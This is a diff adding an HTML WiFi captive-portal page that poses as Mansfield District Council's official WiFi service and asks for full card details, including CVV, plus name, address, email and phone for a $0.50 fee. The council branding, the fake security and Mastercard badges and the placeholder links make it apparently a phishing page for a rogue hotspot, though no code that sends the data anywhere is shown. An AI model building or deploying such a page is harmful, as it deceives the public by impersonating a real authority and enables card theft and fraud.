@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Access - Mansfield District Council</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 450px;
+            width: 100%;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
+            padding: 30px 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .language-toggle {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+        }
+        
+        .language-toggle button {
+            background: rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .language-toggle button:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #e74c3c;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.4;
+        }
+        
+        .security-bar {
+            background: #27ae60;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .form-container {
+            padding: 40px 30px 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e1e8ed;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .form-row .form-group {
+            margin-bottom: 0;
+        }
+        
+        .card-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 4px solid #3498db;
+        }
+        
+        .card-section h3 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .card-section h3::before {
+            content: "💳";
+            margin-right: 8px;
+        }
+        
+        .price-display {
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .price-display h2 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .price-display p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(52, 152, 219, 0.3);
+        }
+        
+        .footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #7f8c8d;
+            border-top: 1px solid #e1e8ed;
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: #ecf0f1;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 500;
+            color: #2c3e50;
+        }
+        
+        .terms {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #7f8c8d;
+            line-height: 1.5;
+        }
+        
+        .terms a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            
+            .container {
+                margin: 10px;
+            }
+            
+            .language-toggle {
+                top: 10px;
+                right: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="language-toggle">
+                <button onclick="toggleLanguage()" id="langToggle">🇫🇷 Français</button>
+            </div>
+            <div class="logo">MDC</div>
+            <h1 id="header-title">Public WiFi Access</h1>
+            <p id="header-subtitle">
+                Mansfield District Council - Official WiFi Service<br>
+                <small>Secure 24h access • One-time fee</small>
+            </p>
+        </div>
+        
+        <!-- Security Bar -->
+        <div class="security-bar" id="security-bar">
+            🔒 SSL Secure Connection • Encrypted Data • GDPR Compliant
+        </div>
+        
+        <!-- Form Container -->
+        <div class="form-container">
+            <!-- Price Display -->
+            <div class="price-display">
+                <h2 id="price-amount">$0.50</h2>
+                <p id="price-description">24h WiFi Access • One-time Payment • No Subscription</p>
+            </div>
+            
+            <!-- Card Information -->
+            <div class="card-section">
+                <h3 id="card-title">Payment Information</h3>
+                
+                <div class="form-group">
+                    <label for="card-number" id="card-number-label">Card Number</label>
+                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiry" id="expiry-label">Expiry Date</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv" id="cvv-label">CVV Code</label>
+                        <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="billing-address" id="billing-label">Billing Address</label>
+                    <input type="text" id="billing-address" placeholder="Full address" required>
+                </div>
+            </div>
+            
+            <!-- Contact Information -->
+            <div class="form-group">
+                <label for="full-name" id="name-label">Full Name</label>
+                <input type="text" id="full-name" placeholder="John Doe" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="email" id="email-label">Email Address</label>
+                    <input type="email" id="email" placeholder="email@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone" id="phone-label">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="+1 555 123 4567" required>
+                </div>
+            </div>
+            
+            <!-- Terms -->
+            <div class="terms">
+                <input type="checkbox" id="terms" required style="margin-right: 8px;">
+                <label for="terms" style="font-weight: normal; display: inline;" id="terms-label">
+                    I accept the <a href="#" target="_blank" id="terms-link">Terms of Use</a> and <a href="#" target="_blank" id="privacy-link">Privacy Policy</a>
+                </label>
+            </div>
+            
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn" id="submit-btn">
+                Activate WiFi Access • $0.50
+            </button>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div class="security-badges">
+                <span class="badge">🔒 SSL Secured</span>
+                <span class="badge">🛡️ PCI DSS</span>
+                <span class="badge">🇺🇸 GDPR</span>
+            </div>
+            <p style="margin-top: 10px;" id="footer-text">
+                Processed by <strong>Mastercard SecureCode</strong> | 
+                <a href="#" style="color: #3498db;" id="support-link">Support</a> | 
+                <a href="#" style="color: #3498db;" id="contact-link">Contact</a>
+            </p>
+            <p style="font-size: 11px; margin-top: 5px;" id="copyright">
+                © 2025 Mansfield District Council. All rights reserved.
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        // Language data
+        const translations = {
+            en: {
+                'header-title': 'Public WiFi Access',
+                'header-subtitle': 'Mansfield District Council - Official WiFi Service<br><small>Secure 24h access • One-time fee</small>',
+                'security-bar': '🔒 SSL Secure Connection • Encrypted Data • GDPR Compliant',
+                'price-amount': '$0.50',
+                'price-description': '24h WiFi Access • One-time Payment • No Subscription',
+                'card-title': 'Payment Information',
+                'card-number-label': 'Card Number',
+                'expiry-label': 'Expiry Date',
+                'cvv-label': 'CVV Code',
+                'billing-label': 'Billing Address',
+                'name-label': 'Full Name',
+                'email-label': 'Email Address',
+                'phone-label': 'Phone Number',
+                'terms-label': 'I accept the <a href="#" target="_blank">Terms of Use</a> and <a href="#" target="_blank">Privacy Policy</a>',
+                'submit-btn': 'Activate WiFi Access • $0.50',
+                'footer-text': 'Processed by <strong>Mastercard SecureCode</strong> | <a href="#" style="color: #3498db;">Support</a> | <a href="#" style="color: #3498db;">Contact</a>',
+                'copyright': '© 2025 Mansfield District Council. All rights reserved.',
+                'lang-button': '🇫🇷 Français'
+            },
+            fr: {
+                'header-title': 'Accès WiFi Public',
+                'header-subtitle': 'Mansfield District Council - Service WiFi Officiel<br><small>Accès sécurisé pour 24h - Tarif unique</small>',
+                'security-bar': '🔒 Connexion sécurisée SSL • Données cryptées • Conformité RGPD',
+                'price-amount': '$0.50',
+                'price-description': 'Accès WiFi 24h • Paiement unique • Pas d\'abonnement',
+                'card-title': 'Informations de paiement',
+                'card-number-label': 'Numéro de carte',
+                'expiry-label': 'Date d\'expiration',
+                'cvv-label': 'Code CVV',
+                'billing-label': 'Adresse de facturation',
+                'name-label': 'Nom complet',
+                'email-label': 'Adresse email',
+                'phone-label': 'Numéro de téléphone',
+                'terms-label': 'J\'accepte les <a href="#" target="_blank">conditions d\'utilisation</a> et la <a href="#" target="_blank">politique de confidentialité</a>',
+                'submit-btn': 'Activer l\'accès WiFi • $0.50',
+                'footer-text': 'Processé par <strong>Mastercard SecureCode</strong> | <a href="#" style="color: #3498db;">Support</a> | <a href="#" style="color: #3498db;">Contact</a>',
+                'copyright': '© 2025 Mansfield District Council. Tous droits réservés.',
+                'lang-button': '🇺🇸 English'
+            }
+        };
+
+        let currentLang = 'en';
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'en' ? 'fr' : 'en';
+            updateLanguage();
+        }
+
+        function updateLanguage() {
+            const lang = translations[currentLang];
+            
+            // Update all text elements
+            Object.keys(lang).forEach(key => {
+                const element = document.getElementById(key);
+                if (element) {
+                    if (key === 'terms-label') {
+                        // Handle HTML content for terms
+                        const termsElement = document.getElementById('terms-label');
+                        if (termsElement) {
+                            termsElement.innerHTML = lang[key];
+                        }
+                    } else {
+                        element.innerHTML = lang[key];
+                    }
+                }
+            });
+            
+            // Update form labels separately since they don't have IDs
+            const labelTranslations = {
+                'card-number-label': lang['card-number-label'],
+                'expiry-label': lang['expiry-label'],
+                'cvv-label': lang['cvv-label'],
+                'billing-label': lang['billing-label'],
+                'name-label': lang['name-label'],
+                'email-label': lang['email-label'],
+                'phone-label': lang['phone-label']
+            };
+            
+            Object.keys(labelTranslations).forEach(labelId => {
+                const labelElement = document.querySelector(`label[for="${labelId}"]`);
+                if (labelElement) {
+                    labelElement.textContent = labelTranslations[labelId];
+                }
+            });
+            
+            // Update button text
+            document.getElementById('langToggle').textContent = lang['lang-button'];
+        }
+
+        // Formatage des champs de carte
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+            let matches = value.match(/\d{4,16}/g);
+            let match = matches && matches[0] || '';
+            let parts = [];
+            
+            for (let i = 0, len = match.length; i < len; i += 4) {
+                parts.push(match.substring(i, i + 4));
+            }
+            
+            if (parts.length) {
+                e.target.value = parts.join(' ');
+            } else {
+                e.target.value = value;
+            }
+        });
+        
+        // Formatage date d'expiration
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0,2) + '/' + value.substring(2,4);
+            }
+            e.target.value = value;
+        });
+
+        // Initialize language
+        updateLanguage();
+    </script>
+</body>
+</html>
